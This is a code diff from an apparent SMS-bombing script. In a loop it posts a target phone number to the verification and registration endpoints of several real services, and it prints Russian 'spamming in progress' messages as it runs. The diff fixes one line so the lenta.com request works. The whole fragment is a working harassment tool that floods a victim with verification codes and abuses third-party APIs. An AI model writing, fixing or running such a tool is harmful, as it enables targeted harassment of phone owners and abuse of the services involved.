@@ -89,7 +89,7 @@ while True:
 	requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
 	print('\033[FИдет процесс спама |           ')
 	requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-	requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
+	requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + _phone})
 	print('\033[FИдет процесс спама /           ')
 	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
 	print('\033[FИдет процесс спама ——           ')
